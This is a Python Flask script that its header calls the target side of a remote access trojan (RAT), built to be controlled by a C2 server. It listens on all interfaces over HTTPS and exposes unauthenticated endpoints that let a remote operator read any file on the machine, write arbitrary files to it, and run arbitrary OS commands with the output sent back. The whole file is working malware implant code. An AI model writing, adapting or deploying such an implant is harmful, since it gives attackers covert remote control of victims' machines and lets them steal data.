#!/usr/bin/python3

# Purpose: RAT Target. This script will provide an interface where the client (C2 server) will receive, upload, and control the target with OS level commands.
# Author: Israel Fernandez
# Date of creation: April 7, 2026

# Deliverables: Upload, Download, Execute

import subprocess
from flask import Flask, jsonify, request
import base64

app = Flask(__name__)

class CMD:
    MSG      = b'\x00'
    EXECUTE  = b'\x01'
    UPLOAD   = b'\x02'
    DOWNLOAD = b'\x03'
    SUCCESS  = b'\x04'

# This is taken from https://stackoverflow.com/questions/287871/how-do-i-print-colored-text-to-the-terminal
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def warn(msg):
    print(f"{bcolors.BOLD}{bcolors.WARNING}[*]{bcolors.ENDC} {msg}")

def err(msg):
    print(f"{bcolors.BOLD}{bcolors.FAIL}[!]{bcolors.ENDC} {msg}")

def success(msg):
    print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+]{bcolors.ENDC} {msg}")

def log(msg):
    print(f"{bcolors.BOLD}[#]{bcolors.ENDC} {msg}")

def encode(msg):
    return base64.b64encode(msg).decode("utf-8")

def decode(msg):
    return base64.b64decode(msg)


@app.errorhandler(Exception)
def handle_error(e):
    return jsonify({
        "error": "Server error",
        "details": str(e)
    }), 500


@app.get("/hello")
def hello():
    return jsonify({
        "ok": True,
        "message": "Hello from secure Flask GET"
    })


@app.post("/echo")
def echo():
    # Expect JSON like: {"message": "hi"}
    data = request.get_json(silent=True) or {}

    return jsonify({
        "ok": True,
        "received": data
    })


@app.post("/download")
def download():
    try:
        payload = request.get_json()
        filename = payload["filepath"].split("/")[-1]
        log(f"Writing to file: {filename}")
        try:
            with open(payload["filepath"], 'rb+') as f:
                data = f.read()
            success(f"Successfully read {len(data)} from {filename}")
            return jsonify({
                "ok": True,
                "data": encode(data)
                })
        except OSError as e:
            err(f"Failed to read {filename}: {e}")
    except Exception as e:
        return jsonify({
            "error": "Internal server error",
            "details": str(e)
        }), 500


@app.post("/upload")
def upload():
    try:
        payload = request.get_json()
        filesize = len(decode(payload["file"]))
        file = decode(payload["file"])
        try:
            with open(payload["filename"], 'wb') as f:
                f.write(file)
            success(f"Successfully sent {payload["filename"]} ({filesize}Bytes)")
            return jsonify({"ok": True})
        except OSError as e:
            err(f"Failed to receive {payload["filename"]} ({filesize}): {e}")
    except Exception as e:
        return jsonify({
        "error": "Server error",
        "details": str(e)
    }), 500



@app.post("/execute")
def execute():
    try:
        payload = request.get_json()
        log(f"Executing {payload["command"]}...")
        try:
            res = subprocess.run(payload["command"].split(" "), capture_output=True, text=True)
            output = (res.stdout + res.stderr)
            success(f"Successfully executed {payload["command"]}...")
            return jsonify({"ok": True, "output" : output})
        except OSError as e:
            err(f"Failed to execute {payload["command"]}: {e}")
            return jsonify({
                "error": f"Failed to execute {payload["command"]} on server",
                "details": f"{e}"
                }), 500
    except Exception as e:
        return jsonify({
        "error": "Server error",
        "details": str(e)
    }), 500



if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8443, ssl_context=("target1.crt", "target1.key")) 

